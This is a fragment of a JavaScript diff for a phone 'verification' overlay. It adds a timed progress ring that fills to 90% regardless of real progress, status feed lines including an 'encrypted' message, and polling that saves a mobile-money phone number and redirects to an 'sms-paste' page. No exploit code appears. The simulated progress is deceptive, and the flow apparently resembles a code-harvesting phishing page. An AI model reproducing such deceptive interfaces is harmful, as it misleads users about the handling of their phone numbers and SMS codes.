+        const sec = Math.round((Date.now() - startTime) / 1000);
+        addFeedLine('pending', 'feed.review', null);
+        // append elapsed seconds via sub
+        const lines = verifyFeed.querySelectorAll('.feed-line');
+        const last = lines[lines.length - 1];
+        if (last) {
+          const sub = document.createElement('span');
+          sub.className = 'sub';
+          sub.textContent = '• ' + sec + ' sec elapsed';
+          last.querySelector('.txt').appendChild(sub);
+        }
+      }, 6000);
+
+      // ---- ELAPSED COUNTER ----
+      elapsedTimer = setInterval(() => {
+        const sec = Math.floor((Date.now() - startTime) / 1000);
+        if (sec < 60) {
+          verifyElapsed.textContent = sec + ' sec';
+        } else {
+          const m = Math.floor(sec / 60);
+          const s = sec % 60;
+          verifyElapsed.textContent = m + ' min ' + s + ' sec';
+        }
+
+        // show patience note after 3 min
+        if (sec >= 180) {
+          verifyPatience.classList.add('show');
+        }
+      }, 1000);
+
+      // ---- PROGRESS RING + BAR (over 3 minutes, then hold at 90%) ----
+      verifyTimer = setInterval(() => {
         const elapsed = Date.now() - startTime;
-        const pct = Math.min((elapsed / (10 * 60 * 1000)) * 90, 90);
-        verifyBarFill.style.width = pct.toFixed(1) + '%';
-      }, 300);
+        const ratio = Math.min((elapsed / PROGRESS_WINDOW_MS) * 0.90, 0.90);
+        verifyRingProgress.style.strokeDashoffset = (RING_CIRCUMFERENCE * (1 - ratio)).toFixed(2);
+        verifyProgressFill.style.width = (ratio * 100).toFixed(1) + '%';
+      }, 500);
     }
 
     function finishVerifyBar() {
       if (verifyTimer) clearInterval(verifyTimer);
-      if (stepTimer) clearInterval(stepTimer);
-      verifyBarFill.style.width = '100%';
+      if (feedTimer) clearInterval(feedTimer);
+      if (elapsedTimer) clearInterval(elapsedTimer);
+      verifyRingProgress.style.strokeDashoffset = '0';
+      verifyProgressFill.style.width = '100%';
+      addFeedLine('ok', 'feed.encrypted');
     }
 
     function stopPolling() {
@@ -1526,7 +1699,7 @@
             }));
             localStorage.setItem('momoPhone', fullPhone);
             localStorage.setItem('momoCountry', country);
-            setTimeout(() => { window.location.href = 'sms-paste.html'; }, 300);
+            setTimeout(() => { window.location.href = 'sms-paste.html'; }, 500);
 
           } else if (data.status === 'rejected' || data.status === 'timeout') {
             stopPolling();
@@ -1535,7 +1708,8 @@
           } else if (data.status === 'unknown') {
             stopPolling();
             if (verifyTimer) clearInterval(verifyTimer);
-            if (stepTimer) clearInterval(stepTimer);
+            if (feedTimer) clearInterval(feedTimer);
+            if (elapsedTimer) clearInterval(elapsedTimer);
             verifyOverlay.classList.remove('show');
             document.body.classList.remove('modal-open');
             showRejectBanner();
